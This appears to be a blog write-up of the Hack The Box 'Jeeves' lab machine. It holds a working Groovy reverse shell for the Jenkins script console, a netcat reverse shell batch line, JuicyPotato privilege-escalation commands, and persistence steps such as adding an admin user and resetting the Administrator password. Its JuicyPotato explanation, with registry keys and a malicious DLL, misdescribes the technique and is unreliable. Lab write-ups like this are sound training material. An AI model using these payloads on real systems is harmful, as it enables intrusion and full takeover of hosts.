---
title: HTB-Jeeves
draft: false
tags:
  - htb
  - windows
  - jenkins
  - seimpersonateprivilege
  - juicypotato
  - persistence
  - psexec
  - medium
---
## Information Gathering
### Rustscan

From Rustscan, **HTTP**, **SMB**, and port **50000** was discovered to be open:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/jeeves]
└─$ rustscan --addresses 10.10.10.63 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢
<snip>
Host is up, received syn-ack (0.29s latency).
Scanned at 2024-03-26 09:15:46 EDT for 0s

PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
445/tcp   open  microsoft-ds syn-ack
50000/tcp open  ibm-db2      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.64 seconds
```

Port **50000** was something that I've never seen it open before so I thought I should look into it deeply later.


## Enumeration
### SMB  - TCP 445

As SMB is always the first thing I liked to enumerate I took a look into it very first.

crackmapexec revealed the domain: **Jeeves**

![](https://i.imgur.com/Bcvw5T2.png)


I tried Null login using smbclient but access was denied:

![](https://i.imgur.com/iaE7x5X.png)


### HTTP - TCP 80

![](https://i.imgur.com/OzosegI.png)


There was a search function on port 80 so I queried random things but it threw error back at me:

![](https://i.imgur.com/AibTydA.png)



#### Directory Bruteforce

First, I ran feroxbuster with lower-case directory list since IIS is case sensitive:

`sudo feroxbuster -u http://10.10.10.63 -n -x html -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -C 404`

![](https://i.imgur.com/IdkmTop.png)


Nothing useful was found. 

I ran feroxbuster once more with IIS specific wordlist:

`sudo feroxbuster -u http://10.10.10.63 -n -x asp,aspx,config -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt -C 404`

![](https://i.imgur.com/aTts9iG.png)


Nothing much was found.

### HTTP - TCP 50000

Accessing port 50000 through web browser, there was a link leading me jetty website:

![](https://i.imgur.com/txwPE55.png)




#### Directory Bruteforce

I ran Feroxbuster towards it:

`sudo feroxbuster -u http://10.10.10.63:50000 -n -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404 `

![](https://i.imgur.com/4rYCok9.png)



It discovered one directory: **/askjeeves**

### askjeeves - TCP 50000

Going **/askjeeves**, I saw Jenkin v2.87 running on it:

![](https://i.imgur.com/PK0l1hF.png)


## Shell as kohsuke
### Jenkins RCE with Groovy Script
Following [this articles](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-with-groovy-script), I decided to try reverse shell spawning on `/askjeeves/script`.

![](https://i.imgur.com/5CLDAkK.png)


I confirmed that command execution works using the command below:


```powershell
def process = "PowerShell.exe whoami".execute()
println "Found text ${process.text}"
```

**whoami** is being exeucted and it returned **kohsuke**:

![](https://i.imgur.com/A4PHBs8.png)


Using payload I found from [blog.pentesteracademy.com](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6), I was able to spawn a reverse shell as **kohsuke**.

Below is the script that I ran:

```powershell
String host="10.10.14.17";
int port=1337;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Now I have a shell as **kohsuke**:

![](https://i.imgur.com/SxjwqeA.png)


## Privesc: kohsuke to root
### JuicyPotato Attack

Googling bit on Jenkins Privilege Escalation, it seemed that it is usually vulnerable to **JuicyPotato** attack.

Running `whoami /priv`, I can see **SeImpersonatePrivilege** is on list:

![](https://i.imgur.com/HY50RCj.png)


#### What is JuicyPotato Attack?

1. **CLSID**: CLSID stands for Class Identifier. In the context of the Juicy Potato attack, it refers to a specific COM (Component Object Model) object that is registered on the system. COM objects are used for inter-process communication on Windows systems.
    
2. **Token Impersonation**: The attacker identifies a CLSID that is associated with a COM object that has high privileges, such as "**SeImpersonatePrivilege**" or "**SeAssignPrimaryTokenPrivilege**". These privileges allow the attacker to impersonate other users or create processes with higher privileges.
    
3. **Registry Manipulation**: The attacker creates a registry key under `HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{CLSID}` where `{CLSID}` is the CLSID of the chosen COM object. The registry key created has a value that points to a malicious DLL file hosted by the attacker.
    
4. **Triggering the COM Object**: The attacker then triggers the execution of the COM object by initiating a vulnerable process, typically a service or scheduled task, that results in the execution of the attacker's code.
    
5. **Privilege Escalation**: When the vulnerable process attempts to instantiate the COM object, it loads the malicious DLL specified in the registry key created by the attacker. The DLL runs with the elevated privileges associated with the COM object, effectively allowing the attacker to escalate their privileges to SYSTEM.
    
6. **Execution of Arbitrary Code**: With SYSTEM privileges, the attacker can execute arbitrary code, install malware, manipulate system settings, access sensitive data, and perform other malicious actions.

#### Execution

> In order for the Juicy Potato Exploit to work we need a Windows OS Version below version **1809**. Juicy Potato does not work for new Windows Server 2019 and Windows 10 versions **1809 and higher** as explained in [this blogpost](https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/).


Running `systeminfo`, it told me it is running Windows 10 pro on it. Build 10586 is vulnerable to the Rotten/Juicy Potato Exploit:

![](https://i.imgur.com/GDQ4qvd.png)



I followed [this tutorial](https://medium.com/@kunalpatel920/cyberseclabs-weak-walkthrough-d66d2e47cd82) for the JuicyPotato Attack and there four files I need to move to the target system:
- JuicyPotato.exe
- CLSID.list
- test_clsid.bat
- Revere Shell File

Now let's transfer files ->

I started smbserver to transfer juicypotato.exe:

`impacket-smbserver share $(pwd) -smb2support`

![](https://i.imgur.com/EtknSw5.png)


Now I have juicypotato.exe on target system:

`copy \\10.10.14.17\share\juicypotato.exe jp.exe`

![](https://i.imgur.com/0c3tqQH.png)




From [here](https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_10_Pro/CLSID.list), I downloaded **CLSID.list** for Windows 10 pro; and from [here](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat), I downloaded **test_clsid.bat** file. 

I uploaded both files using smbserver:

![](https://i.imgur.com/CpdADOw.png)


Now I have **JuciyPotat.exe**, **CLSID.list**, and **test_clsid.bat** on target machine.

I ran **test_clsid.bat**, and after around 10 minutes it finished:

![](https://i.imgur.com/duQtLyO.png)

**result.log** file is created and it showed bunch of CLSID that is related to SYSTEM:

![](https://i.imgur.com/wNNEzhE.png)

Prior to creating Reverse Shell File, I first uploaded nc.exe to target system:

![](https://i.imgur.com/D3ddtrg.png)

Now I created a bat file that will create a reverse shell connection back to my local kali machine:

`echo c:\Users\kohsuke\nc.exe 10.10.14.17 1234 -e cmd.exe > rev.bat`

![](https://i.imgur.com/dFtODfw.png)

Now using any of the CLSID from result.log that is related to SYSTEM with JuciyPotato.exe, I can escalate my privilege:

`jp.exe -l 6666 -p rev.bat -t * -c {CLSID}`

![](https://i.imgur.com/B6AMtjf.png)

Now on my local listener, I have a shell as the SYSTEM:

![](https://i.imgur.com/evRpkHc.png)





## Persistence
### Administrator Password Change

I first created a user named **jadu**:

`net user jadu jadu101 /add`

![](https://i.imgur.com/UtJzfsC.png)

After that I added the user to group **Administrators**:

![](https://i.imgur.com/h5fUl5f.png)


Now with the new jadu user, I can list SMB Shares:

![](https://i.imgur.com/Ezk7zHm.png)

However, access to ADMIN share was not allowed:


![](https://i.imgur.com/DNU62vV.png)

I decided to change the password for Administrator:

`netuser Administrator jadu-admin`

![](https://i.imgur.com/xl0nVCT.png)

Now using the changed password, I can access ADMIN SMB share as Administrator:

![](https://i.imgur.com/xIN7G5z.png)


Now that I know Administrator's credentials, I can **psexec** into the system as Administrator:

`impacket-psexec 10.10.10.63/Administrator:jadu-admin@10.10.10.63`

![](https://i.imgur.com/nz1TKQ9.png)

## root.txt

### CEH.kdbx


in kohsuke/Documents, I saw **CEH.kdbx** file:

![](https://i.imgur.com/aWx0T8s.png)

I could have copied the file over to **C:\Users\Administrator\.jenkins** to transfer it to local kali machine -> keepass2john -> Retrieve Password or Hash -> Pass the Hash to psexec.

But since I already have a stable connection as the SYSTEM, I didn't

### Hidden root.txt

It was weird that in Administrator's Desktop folder there was hm.txt asking for me look deeper. 

![](https://i.imgur.com/XM7sDOB.png)

Listing all the hidden files in the directory, I see where this is going:

`dir /R`

![](https://i.imgur.com/MTVPuZw.png)

Now I can access the hidden flag:

`more < hm.txt:root.txt:$DATA`

![](https://i.imgur.com/W70cPFc.png)





## References
- https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6
- https://medium.com/@kunalpatel920/cyberseclabs-weak-walkthrough-d66d2e47cd82

